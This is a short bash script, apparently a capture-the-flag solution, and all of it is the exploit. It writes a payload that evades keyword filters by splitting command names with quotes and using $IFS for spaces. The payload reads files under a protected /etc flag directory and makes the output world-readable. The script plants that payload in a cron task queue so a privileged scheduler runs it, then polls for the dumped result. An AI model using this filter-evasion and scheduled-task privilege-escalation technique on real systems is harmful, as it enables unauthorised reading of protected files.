#!/bin/bash

mkdir -m 777 /tmp/bypass_exploit
cd /tmp/bypass_exploit

echo '#!/bin/bash' > exploit.sh
echo 'c'\''a'\''t$IFS/etc/ctf_fl*/*>/tmp/bypass_exploit/flag_dump' >> exploit.sh
echo 'ch'\''m'\''od$IFS"777"$IFS/tmp/bypass_exploit/flag_dump' >> exploit.sh
chmod +x exploit.sh

cp exploit.sh /var/spool/ctf_queue/tasks/exploit.sh

echo "[*] Waiting for cron scheduler (up to 60s)..."
while [ ! -f /tmp/bypass_exploit/flag_dump ]; do
    sleep 2
done

echo "[+] Flag Captured:"
cat /tmp/bypass_exploit/flag_dump
